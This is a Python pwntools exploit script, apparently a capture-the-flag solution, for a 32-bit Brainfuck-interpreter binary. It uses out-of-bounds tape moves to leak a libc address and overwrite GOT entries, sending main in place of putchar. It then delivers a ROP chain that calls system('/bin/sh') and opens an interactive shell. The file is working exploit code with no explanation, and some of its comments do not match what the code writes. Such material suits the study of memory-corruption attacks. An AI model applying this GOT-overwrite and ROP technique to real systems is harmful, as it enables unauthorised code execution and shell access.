from pwn import *

context.arch = 'i386'
r = process('./bf')
e = ELF('./bf')
libc = ELF('/lib/i386-linux-gnu/libc-2.27.so')

main = 0x08048671
ret = e.search(asm('ret')).next()

newchars = []
def moveup(n=1):
    return '>'*n
def movedown(n=1):
    return '<'*n
def setbyte(c):
    newchars.append(chr(c))
    return ','
def getbyte():
    return '.'
def getword():
    ret = ''
    for _ in range(4):
        ret += getbyte()
        ret += moveup()
    return ret
def setword(value):
    ret = ''
    for _ in range(4):
        c = value & 0xff
        value = (value >> 8)
        ret += setbyte(c)
        ret += moveup()
    return ret

gdb.attach(r, 'b *0x0804878E')

payload = movedown(0x20)
payload += setbyte(0x2c)
payload += getword()

# overwrite putchar with main
payload += setword(main)

# overwrite fgets with gets
payload += movedown(0x24)
payload += setword(0)
payload += setword(0)

# trigger main again
payload += getword()
r.sendlineafter('instructions except [ ]\n', payload)


### leak libc_base ###
r.send(newchars[0])
libc_base = u32(r.recv(4)) - 0xf7e37730 + 0xf7cf7000
log.info('libc_base: %#x' % libc_base)
gets = libc_base + libc.symbols['gets']
system = libc_base + libc.symbols['system']
sh = libc_base + libc.search('/bin/sh\x00').next()

r.send(''.join(newchars[1:5]))

r.send(p32(gets))
r.send(p32(ret))

rop = []
rop += [system, 0, sh]
r.sendline('\x00'*1040+flat(rop))


r.interactive()
